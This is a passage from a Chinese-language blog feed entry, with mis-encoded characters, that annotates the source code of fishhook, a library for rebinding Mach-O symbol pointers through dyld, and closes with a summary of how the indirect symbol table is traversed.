symbol_loop;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  symbol_loop:;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef struct &#123;</span></span><br><span class="line"><span class="comment">//    const char *dli_fname;  /* Pathname of shared object that</span></span><br><span class="line"><span class="comment">//                               contains address */</span></span><br><span class="line"><span class="comment">//    void       *dli_fbase;  /* Address at which shared object</span></span><br><span class="line"><span class="comment">//                               is loaded */</span></span><br><span class="line"><span class="comment">//    const char *dli_sname;  /* Name of nearest symbol with address</span></span><br><span class="line"><span class="comment">//                               lower than addr */</span></span><br><span class="line"><span class="comment">//    void       *dli_saddr;  /* Exact address of symbol named</span></span><br><span class="line"><span class="comment">//                               in dli_sname */</span></span><br><span class="line"><span class="comment">//&#125; Dl_info;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rebind_symbols_for_image</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                     <span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                     intptr_t slide)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//è·å–Dl_info</span></span><br><span class="line">  Dl_info info;</span><br><span class="line">  <span class="keyword">if</span> (dladdr(header, &amp;info) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">segment_command_t</span> *cur_seg_cmd;</span><br><span class="line">  <span class="keyword">segment_command_t</span> *linkedit_segment = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> symtab_command* symtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> dysymtab_command* dysymtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">//åœ¨lc_segmentä¸­éå†å¯»æ‰¾__LINKEDITçš„section</span></span><br><span class="line">        linkedit_segment = cur_seg_cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//éå†å¯»æ‰¾lc_symtab</span></span><br><span class="line">      symtab_cmd = (<span class="keyword">struct</span> symtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//éå†å¯»æ‰¾lc_dysymtab</span></span><br><span class="line">      dysymtab_cmd = (<span class="keyword">struct</span> dysymtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//æ£€æµ‹å¿…è¦çš„æ•°æ®ç»“æ„æ˜¯å¦éƒ½å­˜åœ¨</span></span><br><span class="line">  <span class="comment">/*</span><br><span class="line">  LC_SYMTABè¿™ä¸ªLoadCommandä¸»è¦æä¾›äº†ä¸¤ä¸ªä¿¡æ¯</span><br><span class="line">	Symbol Tableçš„åç§»é‡ä¸Symbol Tableä¸­å…ƒç´ çš„ä¸ªæ•°</span><br><span class="line">	String Tableçš„åç§»é‡ä¸String Tableçš„é•¿åº¦</span><br><span class="line">  LC_DYSYMTAB</span><br><span class="line">	æä¾›äº†åŠ¨æ€ç¬¦å·è¡¨çš„ä½ç§»å’Œå…ƒç´ ä¸ªæ•°ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„è¡¨æ ¼ç´¢å¼•</span><br><span class="line">  LC_SEGMENT.__LINKEDIT</span><br><span class="line">	å«æœ‰ä¸ºåŠ¨æ€é“¾æ¥åº“ä½¿ç”¨çš„åŸå§‹æ•°æ®</span><br><span class="line">  */</span></span><br><span class="line">  <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">      !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find base symbol/string table addresses</span></span><br><span class="line">  <span class="comment">// è·å–é“¾æ¥æ—¶ç¨‹åºçš„åŸºå€</span></span><br><span class="line">  <span class="comment">// åŸºå€ = __LINKEDIT.VM_Address - __LINK.File_Offset + sildeçš„æ”¹å˜å€¼</span></span><br><span class="line">  <span class="comment">// machoviewéšä¾¿çœ‹ä¸€ä¸ªç¨‹åºçš„__LINKEDIT</span></span><br><span class="line">  <span class="comment">// offset 	| data 					| Description 		| value</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 0x0000390	  0x0000000100002000	  VM Address		  4294975488</span></span><br><span class="line">  <span class="comment">// 0x0000398	  0x0000000000003000	  VM Size			  12288</span></span><br><span class="line">  <span class="comment">// 0x00003A0    0x0000000000002000	  File Offset		  8192</span></span><br><span class="line">  <span class="comment">// 0x00003A8    0x0000000000002690	  File Size			  9872</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// base = 100002000-2000 + slide = 0x0000000100000000 + slide</span></span><br><span class="line">  <span class="comment">// è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå…¬å¼</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> linkedit_base = (<span class="keyword">uintptr_t</span>)slide + linkedit_segment-&gt;vmaddr - linkedit_segment-&gt;fileoff;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ç¬¦å·è¡¨çš„åœ°å€ = åŸºå€ + ç¬¦å·è¡¨åç§»é‡</span></span><br><span class="line">  <span class="keyword">nlist_t</span> *symtab = (<span class="keyword">nlist_t</span> *)(linkedit_base + symtab_cmd-&gt;symoff);</span><br><span class="line">  <span class="comment">// å­—ç¬¦ä¸²è¡¨çš„åœ°å€ = åŸºå€ + å­—ç¬¦ä¸²è¡¨åç§»é‡</span></span><br><span class="line">  <span class="keyword">char</span> *strtab = (<span class="keyword">char</span> *)(linkedit_base + symtab_cmd-&gt;stroff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get indirect symbol table (array of uint32_t indices into symbol table)</span></span><br><span class="line">  <span class="comment">// åŠ¨æ€ç¬¦å·è¡¨åœ°å€ = åŸºå€ + åŠ¨æ€ç¬¦å·è¡¨åç§»é‡</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symtab = (<span class="keyword">uint32_t</span> *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//å†ä¸€æ¬¡éå†loadcommands</span></span><br><span class="line">  cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">          <span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="comment">//æ‰¾åˆ°__DATAå’Œ__DATA_CONSTçš„section</span></span><br><span class="line">	  <span class="comment">//__DATA sectioné‡Œé¢ä¿å­˜çš„æ˜¯ç¬¦å·è·³è½¬çš„å‡½æ•°æŒ‡é’ˆè¡¨</span></span><br><span class="line">	  <span class="comment">// å¯¹__nl_symbol_pträ»¥åŠ__la_symbol_ptrè¿›è¡Œrebind</span></span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123;</span><br><span class="line">        <span class="keyword">section_t</span> *sect =</span><br><span class="line">          (<span class="keyword">section_t</span> *)(cur + <span class="keyword">sizeof</span>(<span class="keyword">segment_command_t</span>)) + j;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _rebind_symbols_for_image(<span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                      <span class="keyword">intptr_t</span> slide) &#123;</span><br><span class="line">    rebind_symbols_for_image(_rebindings_head, header, slide);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols_image</span><span class="params">(<span class="keyword">void</span> *header,</span><br><span class="line">                         intptr_t slide,</span><br><span class="line">                         <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                         size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *rebindings_head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> retval = prepend_rebindings(&amp;rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">    rebind_symbols_for_image(rebindings_head, header, slide);</span><br><span class="line">    <span class="built_in">free</span>(rebindings_head);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(<span class="keyword">struct</span> rebinding rebindings[], size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> retval = prepend_rebindings(&amp;_rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">  <span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// If this was the first call, register callback for image additions (which is also invoked for</span></span><br><span class="line">  <span class="comment">// existing images, otherwise, just run on existing images</span></span><br><span class="line">  <span class="keyword">if</span> (!_rebindings_head-&gt;next) &#123;</span><br><span class="line">    _dyld_register_func_for_add_image(_rebind_symbols_for_image);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c = _dyld_image_count();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; c; i++) &#123;</span><br><span class="line">      _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="å°ç»“">å°ç»“</h1><p>æ•´ä¸ªæµç¨‹ä¸­æœ€å¤æ‚çš„éƒ¨åˆ†æ˜¯<code>perform_rebinding_with_section</code>å®ç°çš„åŠŸèƒ½ã€‚</p>
<p>ç®€å•çš„æ¦‚æ‹¬æµç¨‹ï¼š</p>
<ul>
<li>é€šè¿‡<code>__la_symbol_ptr</code>çš„<code>reserved1</code>å­—æ®µæ‰¾åˆ°ç¬¬ä¸€ä¸ªéœ€è¦åŠ¨æ€ç»‘å®šçš„ç¬¦å·åœ¨åŠ¨æ€ç¬¦å·è¡¨ä¸­çš„ä½ç½®ã€‚</li>
</ul>
<ul>
<li>é€šè¿‡<code>__la_symbol_ptr</code>ä¸­æä¾›çš„æ•°æ®æ‰¾åˆ°åœ¨<code>symbol table</code>ä¸­çš„æ•°æ®ã€‚</li>
</ul>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/__la_symbol_ptr.png" alt="å›¾1"></p>
<p>å›¾ä¸Šå¯ä»¥çœ‹åˆ°<code>reserved1</code>è¢«machoviewå·¥å…·ä¿®æ”¹æˆäº†<code>Indirect Sym Index</code>,ä»–çš„å€¼æ˜¯3.</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/indirect symbols.png" alt="å›¾2"></p>
<p>å¯ä»¥çœ‹åˆ°<strong>ç¬¬å››ä¸ª</strong>å°±æ˜¯éœ€è¦å»¶æ—¶ç»‘å®šçš„ç¬¦å·å¼€å§‹çš„åœ°æ–¹ã€‚ä¸Šé¢çš„å€¼æ˜¯<strong>3</strong>ã€‚</p>
<p>å› ä¸º<strong>0ï¼Œ1ï¼Œ2ï¼Œ3â€¦.</strong></p>
<p>æ‰€ä»¥æ‰¾åˆ°äº†ä»–åœ¨ç¬¦å·è¡¨ä¸­çš„<strong>åç§»é‡</strong>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/symbol%20table.png" alt="å›¾3"></p>
<p>åé¢çš„é€»è¾‘å°±æ¯”è¾ƒå¥½ç†è§£äº†ï¼Œæ‰¾åˆ°ç›®æ ‡å‡½æ•°ï¼Œæ›¿æ¢ç›®æ ‡å‡½æ•°ã€‚</p>
<h1 id="PS">PS</h1><p>ä»<code>github</code>å¯ä»¥è·å–æ³¨é‡Šåçš„ä»£ç ã€‚</p>
<p><a href="https://github.com/turingH/fishhook_analysis" target="_blank" rel="external">https://github.com/turingH/fishhook_analysis</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>æ²¡ä»€ä¹ˆç‰¹åˆ«è¦è¯´çš„ï¼Œè¯¦ç»†çœ‹ä»£ç ï¼Œå¯ä»¥ç»“åˆä¹‹å‰çš„ä¸¤ç¯‡æ–‡ç« ï¼Œæ›´å¥½çš„ç†è§£è¿™éƒ¨åˆ†å†…å®¹ã€‚</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-oæ ¼å¼åˆ†æ</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">mach-oå»¶æ—¶ç»‘å®š</a><br>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="hook" scheme="http://turingh.github.io/tags/hook/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
</feed>
